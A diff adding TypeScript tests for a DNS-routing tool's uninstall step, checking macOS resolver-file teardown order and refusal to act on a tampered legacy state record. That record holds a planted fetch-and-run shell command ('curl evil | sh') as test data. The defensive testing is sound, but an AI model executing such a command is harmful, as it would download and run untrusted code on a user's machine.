@@ -1,5 +1,12 @@
 import { describe, expect, test } from 'bun:test';
-import { formatUninstallReport, tnpTraces } from './uninstall';
+import {
+  applyNativeRouting,
+  macResolverFile,
+  removeNativeRouting,
+  type RoutingDeps,
+  routingStatePath,
+} from './dns-routing';
+import { formatUninstallReport, removeConnectRouting, tnpTraces } from './uninstall';
 
 describe('tnpTraces', () => {
   test('Linux covers config, identity key, log and binary', () => {
@@ -115,5 +122,99 @@ describe('formatUninstallReport', () => {
     expect(formatUninstallReport({ ...report, remaining: [] }, true).join('\n')).toContain(
       'note: journal',
     );
+  });
+});
+
+describe('removeConnectRouting', () => {
+  const INSTALLED = { address: '127.0.0.1', port: 53 };
+  const SESSION = { address: '127.0.0.1', port: 5354 };
+  const DIRS = {
+    current: '/Library/Application Support/tnp',
+    legacy: '/Users/me/Library/Application Support/tnp',
+  };
+  const STATE = routingStatePath(DIRS.current, 'connect');
+  const LEGACY = routingStatePath(DIRS.legacy, 'connect');
+
+  function macDeps(): { deps: RoutingDeps; files: Map<string, string> } {
+    const files = new Map<string, string>();
+    const deps: RoutingDeps = {
+      platform: 'darwin',
+      run: () => '',
+      exists: (path) => files.has(path),
+      read: (path) => {
+        const content = files.get(path);
+        if (content === undefined) throw new Error(`ENOENT ${path}`);
+        return content;
+      },
+      write: (path, content) => void files.set(path, content),
+      remove: (path) => void files.delete(path),
+      log: () => {},
+      warn: () => {},
+    };
+    return { deps, files };
+  }
+
+  // The sequence client-platforms.yml runs on a real Mac: `tnp connect` killed
+  // while running over an installed resolver, then `tnp uninstall --purge`.
+  test('run before the install teardown, it leaves no /etc/resolver/ox behind', () => {
+    const { deps, files } = macDeps();
+    const install = applyNativeRouting({ owner: 'install', target: INSTALLED }, deps).state;
+    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
+    files.set(STATE, JSON.stringify(session));
+    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(SESSION));
+
+    expect(removeConnectRouting(DIRS, deps)).toBe(true);
+    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
+    expect(files.has(STATE)).toBe(false);
+    removeNativeRouting(install, deps);
+    expect(files.has('/etc/resolver/ox')).toBe(false);
+  });
+
+  test('the other order is what left the file: why uninstall runs it first', () => {
+    const { deps, files } = macDeps();
+    const install = applyNativeRouting({ owner: 'install', target: INSTALLED }, deps).state;
+    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
+    files.set(STATE, JSON.stringify(session));
+
+    removeNativeRouting(install, deps);
+    removeConnectRouting(DIRS, deps);
+    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
+  });
+
+  test('a record where 0.5.1 kept it is still torn down, but only as far as TNP could have written', () => {
+    const { deps, files } = macDeps();
+    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
+    files.set('/etc/hosts', '127.0.0.1 localhost\n');
+    // What anything running as the user could leave in its own data directory.
+    files.set(
+      LEGACY,
+      JSON.stringify({
+        ...session,
+        files: [...session.files, '/etc/hosts'],
+        written: { ...session.written, '/etc/hosts': '127.0.0.1 localhost\n' },
+        backups: { '/etc/resolver/ox': 'nameserver 192.0.2.66\n' },
+        down: ['/bin/sh -c "curl evil | sh"'],
+      }),
+    );
+    const ran: string[] = [];
+    const tracing = {
+      ...deps,
+      run: (cmd: string) => {
+        ran.push(cmd);
+        return '';
+      },
+    };
+
+    expect(removeConnectRouting(DIRS, tracing)).toBe(true);
+    expect(files.has('/etc/resolver/ox')).toBe(false);
+    expect(files.get('/etc/hosts')).toBe('127.0.0.1 localhost\n');
+    expect(ran).toEqual([]);
+    expect(files.has(LEGACY)).toBe(false);
+  });
+
+  test('without a recorded session it does nothing', () => {
+    const { deps, files } = macDeps();
+    expect(removeConnectRouting(DIRS, deps)).toBe(false);
+    expect(files.size).toBe(0);
   });
 });
